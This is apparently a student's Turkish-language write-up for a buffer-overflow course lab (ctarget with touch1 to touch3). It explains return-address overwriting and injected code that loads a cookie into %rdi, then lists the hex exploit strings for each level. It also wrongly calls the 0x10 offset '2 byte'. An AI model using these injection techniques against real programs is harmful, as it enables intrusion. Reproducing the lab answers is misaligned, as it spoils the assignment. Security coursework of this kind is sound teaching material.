@@ -1,0 +1,69 @@
+########
+intel core2duo, (little-endian)
+x86_64 ArchLinux dağıtımı,
+gcc 6.3.1 20170109
+objdump 2.27
+########
+
+çözüm açıklamaları:
+seviye1:
+önce objdump ile ctarget dosyamız dump edildi.
+getbuf icersindeki buffer boyutu tespit edildi.(40byte)
+seviye1 için: 40byte 90 ile dolduruldu. 40+8 byte'a touch1in adresi yerleştirildi.
+40+8'e yerleştirmemeizin sebebi çalıştığımız mimari x86_64 mimarisi adresler 8byte boyutundadır.
+x86_64 sistemlerde %rbp registeri frame pointer olarak kullanılmıyor bunun yerine retq sonrası %rsp'nin bir
+üstü geri dönüş adresimizdir. bundan dolayı %rsp'nin hemen üstüne touch1in adresi yerleştirildi.
+
+seviye2:
+x86_64 sistemlerde ilk altı parametre registerlarda tutulur. %rdi ilk parametrenin registeridir.
+bunun için %rdi ye cookie degerini yukleyen
+assembly kodunu yazdık bu komutun machine kodlarını bufferımaza yerleştirdik.
+bu kodun çalıştıralabilmesi için geri dönüş adresimizi bufferimazda yerleştirdiğimiz 
+yer olarak belirttik. onun bir üstüne de touch2 nin adresini yazdık.
+böylece bu kod ile %rdi deki degeri degistirdik(cookie degerini yukledik)
+sonrasında touch2'den itibaren instructionlar execute edilmeye devam etti.
+
+seviye3:
+touch3 fonk. %rdi deki degeri pointer olarak ele alıyor. bundan dolayı %rdi'ye adres bilgisi yuklemeliyiz bu
+adresin işaret ettiği deger ise bizim cookiemizin string hex degerleri.
+cookiemizin ascii tablosundaki hex degerlerini cıkardık.
+%rdi'ye cookiemizin bufferdaki adres degerini yukledik
+buradaki onemli nokta başta cookiemizi 40bytelık buf. alanı içine yerleştirdik, sonrasında gdb ile adım adım
+instructionları debug ederken yerleştirdiğimiz yerdeki veri touch3 tarafından ezildi. çünkü %rsp'nin işaret ettiği
+adres bufferin başında kalıyor. bundan dolayı %rsp+0x10 yani %rspnin 2byte üstüne yerleştirdik. ve assembly kodumuzu ona göre 
+guncelledik. seviye2'de olduğu gibi exploit string kodları sonrası geri dönüş değerimiz touch3 olarak belirttik ve 
+başarıyla touch3'u cagirmiş olduk.
+
+
+
+### EXPLOITLER ###
+
+SEVIYE1:
+90 90 90 90 90 90 90 90 /* 0x55670478 */
+90 90 90 90 90 90 90 90 /* 0x55670480 */
+90 90 90 90 90 90 90 90 /* 0x55670488 */
+90 90 90 90 90 90 90 90 /* 0x55670490 */
+90 90 90 90 90 90 90 90 /* 0x55670498 */
+3f 18 40 00 00 00 00 00 /* 0x556704a0 */
+
+
+SEVIYE2:
+90 90 90 90 90 90 90 90 /* 0x55670478 */
+90 90 90 90 90 90 90 90 /* 0x55670480 */
+90 90 90 90 90 90 90 90 /* 0x55670488 */
+90 90 90 90 90 90 90 90 /* 0x55670490 */
+48 c7 c7 f1 1e d6 5c c3 /* 0x55670498 */
+98 04 67 55 00 00 00 00 /* 0x556704a0 */
+6b 18 40 00 00 00 00 00 /* 0x556704a8 */
+
+
+SEVIYE3:
+90 90 90 90 90 90 90 90 /* 0x55670478 */
+90 90 90 90 90 90 90 90 /* 0x55670480 */
+90 90 90 90 90 90 90 90 /* 0x55670488 */
+90 90 90 90 90 90 90 90 /* 0x55670490 */
+48 8d 7c 24 10 c3 00 00 /* 0x55670498 */
+98 04 67 55 00 00 00 00 /* 0x556704a0 */
+7c 19 40 00 00 00 00 00 /* 0x556704a8 */
+00 00 00 00 00 00 00 00 /* 0x556704b0 */
+35 63 64 36 31 65 66 31 /* 0x556704b8 */
